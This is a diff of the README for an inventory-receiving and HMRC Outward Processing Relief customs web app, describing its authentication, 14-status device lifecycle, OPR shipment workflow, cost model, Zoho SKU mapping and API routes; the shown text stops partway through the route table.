@@ -1,875 +1,222 @@
-# Goods In — Inventory Receiving
+# Goods In — Inventory Receiving & OPR Customs Platform
 
-A modern, scanner-first web application for the **Goods In** (inbound receiving) workflow used by wholesale device traders, refurbishers, and graders.
+A scanner-first web application for wholesale device traders and refurbishers, covering inbound receiving (Goods In), the full device lifecycle (sorting → repair → export → sale), and HMRC Outward Processing Relief (OPR) customs documentation for devices sent abroad for repair and returned.
 
 ## Project Overview
 - **Name**: Goods In
-- **Goal**: Turn the chaotic process of receiving a pallet of phones into a single, frictionless scan-and-print loop — from supplier ASN through to printed internal label.
-- **Stack**: Hono (Cloudflare Pages) · TypeScript · Cloudflare D1 (SQLite) · Tailwind (CDN) · vanilla JS SPA · QRCode.js
+- **Goal**: one frictionless scan-and-print loop for receiving stock, plus the full downstream lifecycle — repair, OPR export/return customs paperwork, cost accounting, and sale reconciliation against Zoho.
+- **Stack**: Hono (Cloudflare Workers) · TypeScript · Cloudflare D1 (SQLite) · Tailwind (CDN) · vanilla JS SPA · QRCode.js (`qrious`)
+- **Current state**: production deployed at commit `3eed023` (2026-10-05). Gate baseline: **808 passed / 8 skipped / 0 failed across 38 files** (`npx vitest run`).
 
 ## Live URLs
 - **Production (Genspark-hosted Cloudflare)**: https://d6aea290-bd61-4f82-aa8d-94378b9f2fec.vip.gensparksite.com
-- **Master Checklist tracker**: https://d6aea290-bd61-4f82-aa8d-94378b9f2fec.vip.gensparksite.com/tracker/
-- **Sandbox preview (dev)**: https://3000-i4zj15jax42ejggi6n8yt-b32ec7bb.sandbox.novita.ai
-- **API health**: `/api/health` (the only unauthenticated endpoint besides `POST /api/auth/login` and the dev-login tombstone)
+- **API health**: `GET /api/health` (unauthenticated — the only fully open route besides login and the dev-login tombstone)
 
 ## Authentication & Multi-Tenancy
+Every route under `/api/*` requires a valid JWT **except** `GET /api/health`, `POST /api/auth/login`, and `POST /api/auth/dev-login` (exempt only so its **410 Gone** tombstone is visible rather than masked as a 401 — it can never mint a token).
 
-Every route under `/api/*` requires a valid JWT **except** `GET /api/health`, `POST /api/auth/login`, and `POST /api/auth/dev-login` (which is exempt only so its **410 Gone** tombstone is visible instead of being masked as a 401 — it can no longer mint a token). Unauthenticated or invalid-token requests get a `401`.
+- **Login**: `POST /api/auth/login` with `{email, password}` → `{token, user}`. Two real per-person accounts under **Saigates Limited** (org id 1): `owner@saigates.com` (admin) and `ops@saigates.com` (operator) — genuinely separate credentials, independent audit trails. Unknown email and wrong password return the identical `401` (no user enumeration).
+- **Password storage**: PBKDF2-SHA256 via WebCrypto (100,000 iterations, 16-byte salt), stored as `pbkdf2$<iters>$<salt-hex>$<hash-hex>`. Plaintext is never stored anywhere.
+- **Roles**: `operator` / `manager` / `admin`. A growing set of routes are **manager-gated** (`requireManager()` — role is `manager` or `admin`): cost-ledger writes, SKU-map edits, inventory valuation reports, repair-control overrides. Any new manager-gated action must filter its own UI affordance by role in the same commit that creates it.
+- **Token**: HS256 JWT (`hono/jwt`), 12h TTL, signed with `JWT_SECRET` (`.dev.vars` locally, `gsk hosted secret_put` in production). Claims: `sub`, `email`, `name`, `role`, `org_id`.
+- **Token-in-URL for print/doc pages**: `window.open()`'d pages (labels, some document views) can't carry a header, so they fall back to a `?token=` query param — `extractToken()` checks the header first. `POST /api/auth/doc-token` mints a short-lived token for this purpose. Known limitation, flagged for hardening: URL tokens can leak into logs/history.
+- **Multi-tenancy**: every domain table carries `organisation_id`; every write records `user_id` + `organisation_id`; every read is scoped `WHERE organisation_id = ?`. One seeded org: Saigates Limited, id `1`.
 
-- **Login (credentialed, 2026-07-28 — replaces the email-only dev-login)**: `POST /api/auth/login` with `{"email", "password"}` returns `{token, user}`. Two real per-person accounts exist under **Saigates Limited** (org id 1): `owner@saigates.com` (admin) and `ops@saigates.com` (operator). These are genuinely separate credentials — each person's writes are attributed to their own user id, giving two independent audit trails. Unknown email and wrong password return the **identical** `401 {"error":"Invalid email or password"}` (no user enumeration).
-- **Password storage**: PBKDF2-SHA256 via WebCrypto (100,000 iterations — the Cloudflare Workers cap — 16-byte random salt, 32-byte key), stored as `pbkdf2$<iters>$<salt-hex>$<hash-hex>` in `users.password_hash`, compared constant-time. **Plaintext passwords are never stored anywhere** — not in rows, not in logs, not in the repo (the migration seeds `password_hash = NULL`, which can never authenticate; a Vitest sweep asserts the hash shape and greps free-text columns for the test plaintexts).
-- **Provisioning (out of band)**: `node scripts/set-password.mjs <email> [password]` prints the plaintext **once** plus a hash-only `UPDATE` statement to run against D1. Passwords are delivered to each person out of band and are changeable in-app.
-- **Change password**: `POST /api/auth/change-password` (authenticated) re-verifies the current password (`401` if wrong, hash untouched), enforces a minimum of 10 characters (`422`), and updates only the caller's own row. The SPA exposes this via the key icon in the header.
-- **Dev-login is gone**: `POST /api/auth/dev-login` returns `410 Gone` and never issues a token; a test sweep proves no unauthenticated route can mint one.
-- **Honest out-of-scope**: no external IdP / SSO / Cloudflare Access, no self-signup, no email verification, no email-based password reset (a forgotten password is re-provisioned by the owner via `set-password.mjs`), single-org only, and the `?token=` print-URL fallback below is still flagged for hardening.
-- **Token**: HS256 JWT (`hono/jwt`), 12h TTL, signed with `JWT_SECRET` (set via `.dev.vars` locally, `wrangler secret put JWT_SECRET` in production). Claims: `sub` (user id), `email`, `name`, `role`, `org_id`.
-- **Sending the token**: the SPA stores it in `localStorage` and axios attaches `Authorization: Bearer <token>` to every API call. The one exception is the DYMO label pages opened via `window.open()` for **Browser Print** mode — a plain browser navigation can't carry a header, so those URLs fall back to a `?token=` query param (`extractToken()` in `src/lib/auth.ts` checks the header first, then the query param). **Known limitation, flagged for later hardening**: tokens in URLs can leak into server logs / browser history — still flagged after the credentialed-login pass; revisit before wiring a real IdP.
-- **Multi-tenancy**: every domain table (`received_devices`, `device_events`, `webhooks`, etc.) carries `organisation_id`. Every write records both `user_id` and `organisation_id` from the verified token; every read query is scoped with `WHERE organisation_id = ?`. There is currently one seeded organisation (**Saigates Limited**, id `1` — renamed from `Default Organisation` in migration 0016).
-- **Who am I**: `GET /api/auth/me` returns `{user}` for the current token — used by the SPA on boot to validate a stored token before loading app data, and by any external client to sanity-check its token.
+## Device Status Lifecycle
 
-## Workflow Implemented
+`received_devices.status` is a 14-value enum (`src/types.ts` `DEVICE_STATUSES`), enforced end-to-end by a single choke point, `transitionDevice()` (`src/lib/deviceLifecycle.ts`):
 
-### A. Expected Devices (ASN / Manifest)
-- **Upload module** in `Manifests` view: drag-and-drop or click to ingest **CSV / XLS / XLSX**.
-- Auto-parses the supplier's *Packing List* format (the provided `YH001-Saigates Limited_260608.xlsx` works out of the box — columns: OEM, Condition, Description, Grade, MODEL NO., IMEI).
-- Validates identifiers (strictly **15-digit IMEIs** passing the GSMA Luhn checksum, or **10-character alphanumeric serials** for non-cellular devices — rule tightened 2026-07-28 per owner brief; 14-digit TAC+SN and 16-digit IMEISV forms are rejected), de-duplicates, and pre-resolves a candidate SKU from the description.
-- **Optional valuation-hint columns** (added 2026-07-28 after the owner asked “no option to include the prices in USD and VAT Type — do we add the prices at a later stage?” while manually testing): the upload mapper also recognises **Unit cost** (`unit cost`, `price`, `buy price`…), **Currency** (`currency`, `curr`, `ccy` — ISO 4217, uppercased at import so `usd` → `USD`) and **VAT type** (`vat type`, `vat`, `vat scheme` — `MARGIN` / `STANDARD` / `ZERO` / `PVAT`, where **PVAT = Postponed VAT**, import accounting). When the price header **embeds the currency** — e.g. `Price (USD)`, `Unit Cost (GBP)` (the real Saigates supplier format) — it auto-maps as the unit-cost column and the ISO code is **inferred from the header** for rows that carry a price, so no separate Currency column is needed. Each row's hints are validated server-side at import with the **same validators** goods-in uses; a row with a junk hint (unknown currency, negative price, bad VAT type) is flagged in the response's `invalid_valuations` and **skipped** — never silently stored — and the UI shows a warn toast with the skipped count. At scan time, a matched line's hints **pre-fill** the confirm modal's Buy price / Currency / VAT type. **Hints only**: `/scan/confirm` still requires operator-confirmed valuation, and the operator's (possibly edited) values are what land on the received device — the manifest line itself is never modified.
-- Populates the **Pending Receipt Queue** visible in the receive view.
-- Progress widget shows `received / expected` and a `%` bar that updates after every scan.
+| Status | Notes |
+|---|---|
+| `RECEIVED` | Default on goods-in |
+| `SORTING` | |
+| `ACTIVE_INVENTORY` | Sellable stock |
+| `IN_HOUSE_REPAIR` | Repair-workflow-only (see below) |
+| `READY_FOR_EXPORT` | Precursor to OPR/temp-export consignments |
+| `IN_EXPORT_CONSIGNMENT` | OPR-workflow-only — shared precursor for OPR export AND temp-standard export |
+| `EXPORTED_UNDER_OPR` | OPR-workflow-only |
+| `RETURNED_UNDER_OPR` | OPR-workflow-only |
+| `TEMP_EXPORTED_STANDARD` | OPR-workflow-only — non-customs temporary export |
+| `RETURNED_UNDER_STANDARD` | OPR-workflow-only |
+| `SOLD` | Reachable from RECEIVED/SORTING/ACTIVE_INVENTORY/IN_HOUSE_REPAIR/READY_FOR_EXPORT/QC_FAILED/READY_FOR_ZOHO via `applyZohoSaleImport`; terminal — no outbound edge |
+| `REJECTED` | Only outbound edge is back to `RECEIVED` (mandatory reason code either direction) |
+| `QC_FAILED` | Repair-workflow-only |
+| `READY_FOR_ZOHO` | Repair-workflow-only — gate before a device can join a (manual, not-yet-automated) Zoho batch |
 
-### B. Scan Individual IMEIs (HID barcode scanner)
-- The receive view has a **globally focused input** — clicking anywhere outside form controls refocuses the scan box, so a Honeywell/Zebra HID scanner can fire `IMEI\n` repeatedly without interaction.
-- On scan the frontend optimistically pulses the input ring, plays a short WebAudio bleep (toggleable), and cross-references the IMEI against the active manifest.
-- Edge cases handled:
-  - **Matched** → opens a confirm-SKU modal (suggested SKU pre-filled).
-  - **Duplicate** → amber toast with the existing UUID, no double-receive.
-  - **Unreconciled (not on manifest)** → red warning ring + modal forcing the operator to either **Reject** the device (audit-logged) or **Force-add** it to the *Unreconciled* bucket for manager review.
-  - **Rejected** (malformed IMEI) → red bleep + toast.
+**Workflow-only guards** — the generic `POST /api/devices/:id/transition` route refuses to move a device into *or* out of these statuses (409); only the dedicated routes may drive them, keeping shipment_lines / repair_jobs in lockstep with the device ledger:
+- `OPR_WORKFLOW_ONLY_STATUSES`: `IN_EXPORT_CONSIGNMENT`, `EXPORTED_UNDER_OPR`, `RETURNED_UNDER_OPR`, `TEMP_EXPORTED_STANDARD`, `RETURNED_UNDER_STANDARD` — only `src/routes/opr.ts`'s `/shipments/:id/{lines,scan,finalise,restock}` endpoints may drive these.
+- `REPAIR_WORKFLOW_ONLY_STATUSES`: `IN_HOUSE_REPAIR`, `QC_FAILED`, `READY_FOR_ZOHO` — only `src/routes/devices.ts`'s `/repair/*` endpoints may drive these.
 
-### C. Add / Confirm SKU
-- If the manifest's description maps cleanly, the suggested SKU is auto-built using `BRAND-MODELSHORT-CAPACITY-COLOR` (e.g. `SMSG-S24-512-PBK`).
-- Operator can override any field (brand / model / capacity / color / grade) before confirming.
-- **Grade options**: `A+`, `A`, `B+`, `B`, `C+`, `C`, `D`, and **`UG`** (Ungraded / Untested — for devices arriving without a supplier grade or routed straight to QC). `UG` shows up as a violet badge throughout the UI to make ungraded stock easy to spot.
-- Force-add path generates the same SKU shape for off-manifest devices.
-- **Valuation & VAT** (required on **every** path that creates a device — `/confirm`, `/force-add`, AND `/manual` (Quick receive). General rule, earned through evidence after force-add shipped as a real bypass: any intake path enforces the same server-side valuation rules, and any future intake path inherits `required: true` by default): **buy price**, **currency** (ISO 4217, default `GBP` — an unrecognised code like `UKL` is rejected with a `422`, server-side, regardless of what the UI allowed through), **VAT type** (`MARGIN` / `STANDARD` / `ZERO` / `PVAT` — Postponed VAT for import accounting, added 2026-07-28 per owner confirmation), and an optional **supplier id** (confirm only). The client-side checks in the confirm and force-add modals are optimistic only, to save an obviously-wasted round trip — `src/lib/validate.ts` on the server is the authoritative validator and is what actually enforces these rules.
+Every status change writes an atomic D1 `batch()` of the `received_devices` UPDATE + a `device_events` append-only audit row — a device's `status` always equals the `to_status` of its own most recent event. `GET /api/devices/meta/statuses` returns the full enum + allowed-transition map so a future UI/CRM never hardcodes it.
 
-### D. Print Label — connects to a real DYMO LabelWriter
-- On confirm, a print job is queued in the `print_jobs` table with a JSON payload.
-- **Two label formats supported** (toggle in the top bar — preference persists per browser via `localStorage`):
-  - **DYMO 57×32mm** (landscape, default) — large-format label for the warehouse floor.
-  - **DYMO 32×57mm** (portrait) — compact label for the receiving desk.
-- **Rotate-90° toggle** (top bar ↻ icon, also exposed in Settings) — for DYMO LabelWriter setups where the label roll feeds the **short edge first**, so a 57×32 landscape page would otherwise come out sideways and overflow onto a second sticker. With rotate on, the `@page` is declared as 32×57 (what the printer expects) while the label content stays landscape and is CSS-rotated 90° internally — one label, correct orientation, one sticker. Persisted as `labelRotate.v1` in `localStorage`.
-- Both labels carry the same data and **two QR codes** (rendered by `qrious@4.0.2`):
-  - **Main QR** — encodes `{uuid, sku, imei}` as JSON. Routes the device to any internal scan target.
-  - **IMEI QR** — plain-text IMEI only. Lets cheap or basic scanners (or warranty/repair tools that expect raw IMEIs) read the IMEI directly from the printed label without parsing JSON.
-- Plus the human-readable fields:
-  - Internal **UUID** (12-char short code)
-  - Clean human-readable **SKU**
-  - **IMEI** in monospace
-  - Brand · Model · Capacity · Grade (incl. the **UG / Ungraded** state)
+## OPR (Outward Processing Relief) & Customs Domain
 
-#### Three printer modes (choose in **Settings**)
+Full HMRC customs lifecycle for devices sent abroad for repair under OPR, or temporarily exported for non-customs reasons, and returned:
 
-| Mode | What happens when you click `Send` | When to use |
-|---|---|---|
-| **Browser Print** (default) | App opens a print window pre-sized via `@page size: 50mm 30mm` (or 32×57mm) — your OS print dialog appears, you pick the DYMO printer and click Print. After printing, the window posts back and jobs are marked `sent` automatically. | Easiest setup — just install the DYMO driver. Works for single-operator stations. |
-| **PrintNode** (cloud) | Server-side `POST` to `https://api.printnode.com/printjobs` with `pdf_uri` pointing back at `/api/print/label/:id`. The PrintNode agent on the warehouse PC picks up the job and feeds it straight to the DYMO LabelWriter — no operator print dialog. | Multi-station / hands-off / unattended printing. Requires a PrintNode account + agent installed on the LAN. |
-| **Manual / Off** | Just flips `print_jobs.status` to `sent`. No physical print. | Testing / when labels are printed via some external workflow. |
+- **Authorisations** (`opr_authorisations`) — the holder's OPR Authorisation Number, EORI, CDS number, supervising office, commodity scope, rate of yield, discharge period, and carrier pre-alert mailbox/cutoff. The Saigates record is seeded data, not hardcoded.
+- **Shipments** (`shipments` / `shipment_lines`) — a consignment entity above individual devices. `direction` (`export`|`import`), `status` (`DRAFT`|`FINALISED`|`CANCELLED`), procedure codes (`2100`/`2200` export, `6121` import; `2100+B51` forbidden; `B51`/`B02` pair with `2200`), GBP-only currency, mandatory authorisation linkage.
+- **Lines are frozen snapshots**: adding a device to a DRAFT shipment snapshots its IMEI/SKU/attributes/`buy_price` at that moment — later device edits never leak into the declared customs line.
+- **Validation engine**: `GET /shipments/:id/validation` — ~10 coded green/amber/red checks (currency, authorisation validity on ship date, procedure codes, commodity scope, IMEI Luhn/uniqueness, declaration text, unit values pence-exact, totals consistency, logistics, discharge-window for imports). Red blocks finalisation with zero side-effects.
+- **Finalisation**: `POST /shipments/:id/finalise` — direction-aware (same endpoint drives both export-finalise and import-receipt). Export: every line's device → `EXPORTED_UNDER_OPR` (or `TEMP_EXPORTED_STANDARD`), captures `export_mrn`/`ducr`/`ead_mrn`. Import: devices → `RETURNED_UNDER_OPR`, captures `import_mrn`. `POST /shipments/:id/finalise/resume` recovers a partially-applied finalise.
+- **Return-completeness**: partial returns are supported — only devices actually returned move status; the rest stay `EXPORTED_UNDER_OPR`/`TEMP_EXPORTED_STANDARD` until a later return consignment picks them up. `GET /discharge` is the tracker (exported vs returned vs outstanding, deadline = export date + authorisation discharge period, status open/closing/overdue).
+- **C&E1154 duty-relief form**: `GET /shipments/:id/ce1154` — quantity from the consignment, repair cost → GBP at the customs rate, exported-goods value = frozen declared-at-export value of the *returning* devices only, relief = duty on (goods+repair) minus duty on repair. Uses the OPR Authorisation Number field; the CDS number appears only in the cross-reference statement.
+- **Correspondence & honesty gates**: pre-alert and clearance-instruction drafts are built server-side; *actually sending* (`/prealert/send`, `/clearance/send`) goes via the Gmail REST API and refuses `503 gmail_not_configured` (writing nothing) unless all three `GMAIL_*` secrets are set — no real email has ever been sent by this system (stubbed-wire-level tested only). A manual-send path (`/prealert/mark-sent`, `/clearance/mark-sent`) records an honest `provider=manual` outbox row for operators who send from their own mail client. `sent_emails` is the outbox of record.
+- **Value corrections & misdeclaration**: `POST /shipments/:id/lines/:lineId/correction` + a manager-review step record post-finalisation corrections to a declared line without rewriting the frozen original; `POST /shipments/:id/reconcile-value` + `GET /value-deltas` track goods-value reconciliation deltas; `POST /shipments/:id/misdeclaration-ack` is the manager-acknowledged path for a known-wrong declared value that isn't being corrected.
+- **Bulk builders**: `POST /shipments/:id/scan-bulk` and `/bulk-serials` add many devices in one call with independent per-device outcomes — a failed entry leaves zero side-effects and never blocks the rest. (See **Testing** below — this endpoint's sequential-per-device write is the subject of a standing gate-reliability note, Z-20.)
 
-The Settings view (gear icon in the top bar) toggles between modes, lets you paste & store a PrintNode API key (kept server-side — never returned to the browser), and pulls the live list of available printers from PrintNode so you can map the DYMO 50×30 and DYMO 32×57 stations independently.
+Full endpoint table below under **Functional Entry URIs**.
 
-### E. Inventory Update
-- A successful confirm writes a `received_devices` row with `status = 'RECEIVED'`.
-- The IMEI is now visible in the **Inventory** view with full search (UUID/SKU/IMEI), source badge (manifest vs unreconciled), and print status.
+## Cost Model
 
-### F. Device Status Lifecycle & Audit Trail
-Every `received_devices` row carries a `status` enum, defaulting to `RECEIVED`:
+**Acquisition cost** (`src/lib/acquisitionCost.ts`, `computeAcquisitionCostGbp()`): for a given device, prefers the sum of any `cost_ledger` rows with `cost_type='purchase'` for that device; falls back to `received_devices.buy_price` (the goods-in valuation) **only when the ledger has zero purchase rows for that device**. Returns `{acquisition_cost_gbp, acquisition_source}` where `acquisition_source` is `'cost_ledger' | 'goods_in_buy_price' | 'none'` — `'none'` means genuinely no cost basis exists yet (not zero). This is a **computed read, not a stored column and not a new ledger writer** — deliberately, to avoid double-counting against the existing bill-close and manual cost-entry writers.
 
-`RECEIVED → SORTING → {ACTIVE_INVENTORY | IN_HOUSE_REPAIR | READY_FOR_EXPORT}`, `IN_HOUSE_REPAIR → ACTIVE_INVENTORY`, `RECEIVED → REJECTED`, and — wired by OPR 2 — `READY_FOR_EXPORT ↔ IN_EXPORT_CONSIGNMENT → EXPORTED_UNDER_OPR`.
+`computeDeviceCostBreakdown()` extends this with `repair_cost_gbp` + `freight_cost_gbp` (summed from `cost_ledger`) and a `total_cost_gbp` (acquisition, treating `null` as 0 for this sum only, plus repair plus freight). See `docs/plan/z2-acquisition-cost.md` for the full design decision.
 
-`ACTIVE_INVENTORY`, `EXPORTED_UNDER_OPR`, `REJECTED` are currently terminal. The export transitions are **OPR-workflow-only**: a device becomes `IN_EXPORT_CONSIGNMENT` exactly when it has a line on a DRAFT export shipment and `EXPORTED_UNDER_OPR` exactly when that shipment finalises, so the generic `/api/devices/:id/transition` endpoint refuses to move devices into **or** out of those statuses (409) — only the `/api/opr/shipments/:id/lines|scan|finalise` endpoints may drive them, keeping `shipment_lines` and the device ledger in lockstep. The return leg is wired by OPR 3: `EXPORTED_UNDER_OPR → RETURNED_UNDER_OPR` happens exactly when an import (return) shipment finalises, and `RETURNED_UNDER_OPR → ACTIVE_INVENTORY` via the explicit `/restock` step — both OPR-workflow-only, refused by the generic endpoint. `SOLD` exists in the enum but stays unwired (downstream sales flow, not OPR). `GET /api/devices/meta/statuses` returns the full enum plus the exact allowed-transition map so a future UI/CRM never has to hardcode it.
+**Inventory valuation** (`GET /api/reports/inventory-valuation`, manager-gated): totals owned stock using an explicit **inclusion list** (`VALUATION_INCLUDED_STATUSES` in `src/routes/reports.ts`), not an exclusion list — written this way deliberately so a 15th future status forces whoever adds it to decide where it belongs rather than silently joining or leaving the total. Currently includes every status except `SOLD` (the sole true exclusion — once sold it's no longer owned stock) and `REJECTED` (reported on its own separate line, since it can still be corrected back to `RECEIVED`).
 
-All status changes go through a single choke point, `transitionDevice()` (`src/lib/deviceLifecycle.ts`):
-1. Validates the requested transition against the allowed-transition map — anything not listed is rejected with `409 invalid_transition`.
-2. Writes the `received_devices` UPDATE and a `device_events` INSERT in one atomic D1 `batch()` call, so the two can never diverge.
-3. Invariant enforced by construction: a device's `status` always equals the `to_status` of its own most recent `device_events` row.
+**Bills** (`src/routes/bills.ts`, `src/lib/billBuilder.ts`): purchase and repair bills share one builder. Closing a bill writes `cost_ledger` rows (`write-cost-ledger`); `force-close` and `repair-control` are manager-gated overrides for edge cases (e.g. a bill that needs closing before every manifest line reconciles).
 
-`device_events` is an **append-only audit log** — every receive, status transition, and rejection is recorded with `organisation_id`, `device_id`, `event_type` (`RECEIVE` / `STATUS_CHANGE` / `REJECT`), `from_status`, `to_status`, `user_id`, an optional `reference`, and optional JSON `metadata`. Nothing is ever updated or deleted from this table. The pre-existing `scan_events` table (matched/duplicate/unreconciled/rejected scan attempts, before a device is created) is unchanged and still written alongside it.
+## SKU Map & Zoho CSV Round-Trip
 
-**A subset of transitions is workflow-only, not just role-gated**: `IN_HOUSE_REPAIR`, `QC_FAILED`, and `READY_FOR_ZOHO` are `REPAIR_WORKFLOW_ONLY_STATUSES` — the generic `/api/devices/:id/transition` route refuses to move a device into **or** out of any of them (409) regardless of what `ALLOWED_TRANSITIONS` lists for that edge; only the dedicated `/repair/*` routes (`start`, `scan-back`, `qc`, `reopen`, `close-to-inventory`) may drive them. Any new UI control for a manager-gated action must filter its own visibility by role in the same commit that creates the control — see the standing process rule in `test/browser/README.md` (search "any manager-gated action needs its affordance filtered by role").
+`src/routes/skuMap.ts` maps this system's internal SKUs (`sku_catalog`) to Zoho's item IDs — the first legitimate write surface in production outside the core scan/lifecycle/bill flows, gated to manager/admin.
 
-### G. Read API, Export & Webhooks
-- `GET /api/devices` and `GET /api/devices/:id` are the primary integration seam for a future CRM/OPR module — filterable, paginated, org-scoped, with `:id` returning the full event history alongside the device.
-- `GET /api/devices/export/csv` exports a CSV (`Content-Disposition: attachment`) of the currently-filtered devices, or an exact operator-picked selection via `?ids=1,2,3`. Because the file is an audit artefact it never returns a *plausible-looking wrong answer*: a mistyped `status`/`source` or a non-numeric id is a **400** (not an empty CSV that reads as "no such devices", and not a quietly shortened selection), and a match above the 5000-row cap is a **413** carrying the true total rather than a truncated file. Rows are RFC 4180 quoted and CRLF-delimited so a comma/quote/CR/LF inside a value cannot shift a column or split a row; `X-Export-Row-Count` lets the caller verify it got every row.
-- `POST /api/devices/:id/transition` fires an outbound webhook (if any are configured for the org) after every successful status change — see **Outbound Webhooks** below.
+- `GET /api/sku-map` — list/search the mapping table.
+- `GET /api/sku-map/unmapped` + `/unmapped/export` (CSV) — devices whose SKU has no Zoho mapping yet, scoped to `SKU_MAP_RELEVANT_STATUSES` (statuses where a device might still need a future Zoho bill line — excludes anything already `SOLD`, `REJECTED`, or already committed to an OPR/temp-export consignment, since those will never generate a Zoho bill line).
+- `GET /api/sku-map/orphans` — Zoho item IDs with no matching internal SKU.
+- `POST /api/sku-map/import` — CSV round-trip import (`src/lib/skuMapImport.ts`): parses, validates, and applies a bulk mapping update.
+- `GET /api/sku-map/version` — a change-token for cache/sync purposes.
 
-## Outbound Webhooks
-
-Configured per-organisation via `POST /api/webhooks` (`{url}` → returns `{id, url, secret, enabled}` — **the secret is only ever returned once, at creation time**, the same rule as the PrintNode API key). Every successful `POST /api/devices/:id/transition` then POSTs a JSON payload to every `enabled` webhook for that org:
-
-```json
-{
-  "event": "device.status_changed",
-  "organisation_id": 1,
-  "device_id": 15,
-  "imei": "356102152723494",
-  "uuid": "B44FF3AA791C",
-  "from_status": "SORTING",
-  "to_status": "ACTIVE_INVENTORY",
-  "user_id": 1,
-  "occurred_at": "2026-07-27T17:50:21.762Z"
-}
-```
-
-The request carries `X-Signature: sha256=<hex>` — an HMAC-SHA256 of the exact raw JSON body, keyed with the webhook's secret (same pattern as GitHub/Stripe signature verification: recompute the HMAC over the raw body you received, with the secret you were given at creation time, and compare hex strings). Delivery failures are logged and swallowed — a downstream system being down must never block or fail the transition that triggered it. `POST /api/webhooks/:id/toggle` (`{enabled}`) disables/enables delivery without deleting the config; `DELETE /api/webhooks/:id` removes it.
+**Zoho sale import** (`src/lib/zohoSaleImport.ts`, mounted at `/api/zoho-sale-import` as of 2026-09-11, Quick Item B): applies a Zoho sale-export CSV against the device ledger via `applyZohoSaleImport()`. Matches a sold Zoho line to a device and drives it to `SOLD` via a direct `transitionDevice()` call (reachable from RECEIVED/SORTING/ACTIVE_INVENTORY/IN_HOUSE_REPAIR/READY_FOR_EXPORT/QC_FAILED/READY_FOR_ZOHO — deliberately wide, since Zoho is the authoritative external record of the sale *fact* and can legitimately record a sale before this app's own internal tracking has caught up). A device already in an OPR/temp-export consignment status, or already `REJECTED`, surfaces as a named conflict rather than a silent status write or a thrown error. Money columns (`sold_price_pence`) are integer pence, never float, per the project's money-column convention.
 
 ## Functional Entry URIs
 
 ### Pages (UI)
 | Path | Description |
 |---|---|
-| `/` | Single-page app (Dashboard / Manifests / Receive / Inventory / Print Queue) |
+| `/` | Single-page app — all views (Dashboard / Manifests / Receive / Inventory / OPR / Print Queue / Settings) render client-side from `/static/app.js` |
 
-### API
-Every row below is under `/api/*` and requires `Authorization: Bearer <token>` **except** the two marked 🔓. All are scoped to the caller's `organisation_id`.
+### API — mounted route groups
+All under `/api/*`, requiring `Authorization: Bearer <token>` except where marked 🔓. All scoped to the caller's `organisation_id`. 🔒🔒 marks manager/admin-only routes.
 
-| Method | Path | Auth | Description |
+| Mount | File | Auth | Purpose |
 |---|---|---|---|
-| `GET`  | `/api/health` | 🔓 | Liveness probe |
-| `POST` | `/api/auth/login` | 🔓 | Body: `{email, password}`. Returns `{token, user}`; identical 401 for unknown email / wrong password |
-| `POST` | `/api/auth/dev-login` | 🔓 | **410 Gone** tombstone — removed 2026-07-28, never issues a token |
-| `POST` | `/api/auth/change-password` | 🔒 | Body: `{current_password, new_password}`. Re-verifies current (401), min 10 chars (422), updates caller's own hash only |
-| `GET`  | `/api/auth/me` | 🔒 | Returns `{user}` for the current token |
-| `GET`  | `/api/inventory/stats` | 🔒 | Counts for dashboard tiles |
-| `GET`  | `/api/manifests` | 🔒 | List manifests with progress |
-| `GET`  | `/api/manifests/:id` | 🔒 | Detail with expected & unreconciled |
-| `POST` | `/api/manifests` | 🔒 | Create manifest. Body: `{reference, supplier, notes?, rows[]}`. Rows may carry optional valuation hints `unit_cost` / `currency` (ISO 4217, uppercased) / `vat_type` (`MARGIN`\|`STANDARD`\|`ZERO`\|`PVAT`) — validated per row; bad-hint rows are returned in `invalid_valuations` and skipped |
-| `POST` | `/api/manifests/:id/close` | 🔒 | Close manifest |
-| `POST` | `/api/manifests/:id/reopen` | 🔒 | Reopen manifest |
-| `DELETE` | `/api/manifests/:id` | 🔒 | Delete manifest (received devices remain) |
-| `POST` | `/api/scan` | 🔒 | Scan IMEI. Body: `{manifest_id, imei}`. Returns `matched` / `duplicate` / `unreconciled` / `rejected`. Server re-validates the identifier (**strictly 15 digits + Luhn**, or a **10-character alphanumeric serial** for non-cellular devices, uppercased) regardless of client-side checks |
-| `POST` | `/api/scan/confirm` | 🔒 | Confirm matched SKU. Body: `{expected_device_id, sku, brand, model, capacity, color, grade, notes?, auto_print?, buy_price, currency, vat_type, supplier_id?}`. Valuation fields (`buy_price`, `currency`, `vat_type`) are **required**, validated server-side (`422` on missing/invalid — e.g. an unrecognised ISO 4217 code). `auto_print:false` receives **without** queueing a print job (the UI's **Confirm only** button); `true`/omitted queues one (**Confirm & Print**) |
-| `POST` | `/api/scan/force-add` | 🔒 | Force-add unreconciled IMEI to inventory. Same body shape as `/confirm`; valuation fields are optional here but still server-validated if present |
-| `POST` | `/api/scan/manual` | 🔒 | Manually add a device outside the scan flow. Same valuation rules as `/force-add` |
-| `POST` | `/api/scan/reject` | 🔒 | Audit-log a rejection (writes a `REJECT` `device_events` row) |
-| `GET`  | `/api/scan/events/:manifestId` | 🔒 | Recent scan events |
-| `GET`  | `/api/inventory` | 🔒 | List received devices. Query: `q`, `source`, `manifest_id`, `limit` |
-| `DELETE` | `/api/inventory/:id` | 🔒 | Delete a received device. Restores its manifest line to `pending`, removes queued labels, writes a `DEVICE_DELETED` `device_events` row |
-| `POST` | `/api/inventory/grade` | 🔒 | Set/override grade for one or more devices. Body: `{ids: number[], grade, actor?, reason?}`. One `grade_audit` row + one `GRADE_CHANGE` `device_events` row per changed device |
-| `GET`  | `/api/inventory/grade-audit/:id` | 🔒 | Grade-change history for a single device |
-| `GET`  | `/api/devices?status=&source=&q=&page=&page_size=` | 🔒 | Filterable, paginated device list. `status` accepts a comma-separated list; an unrecognised status is rejected with `400` |
-| `GET`  | `/api/devices/:id` | 🔒 | Full device record + its `device_events` history (newest first) |
-| `GET`  | `/api/devices/export/csv?status=&source=&ids=` | 🔒 | CSV export (`Content-Disposition: attachment`, RFC 4180/CRLF, `X-Export-Row-Count` header). `ids` (comma-separated) takes precedence over `status`/`source` for exporting an exact selection. Fails loudly rather than returning a misleading file: invalid `status` (comma-separated list accepted) / `source` / non-numeric `ids` → **400**; a selection above the 5000-row cap → **413** with the true total, never silent truncation |
-| `GET`  | `/api/devices/meta/statuses` | 🔒 | Returns `{statuses, transitions}` — the full status enum and allowed-transition map |
-| `POST` | `/api/devices/:id/transition` | 🔒 | The single entry point for status changes. Body: `{to_status, reference?, metadata?}`. `409 invalid_transition` if not allowed from the current status; fires configured webhooks on success |
